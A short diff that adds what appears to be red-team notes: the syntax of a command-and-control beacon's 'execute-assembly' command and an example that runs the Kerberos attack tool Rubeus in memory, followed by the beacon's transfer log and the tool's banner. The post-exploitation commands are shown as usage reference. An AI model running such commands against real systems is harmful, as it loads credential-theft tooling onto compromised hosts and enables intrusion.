@@ -1,0 +1,14 @@
+beacon > execute-assembly [/path/to/script.exe] [arguments]
+beacon > execute-assembly /home/audit/Rubeus.exe
+[*] Tasked beacon to run .NET program: Rubeus.exe
+[+] host called home, sent: 318507 bytes
+[+] received output:
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  
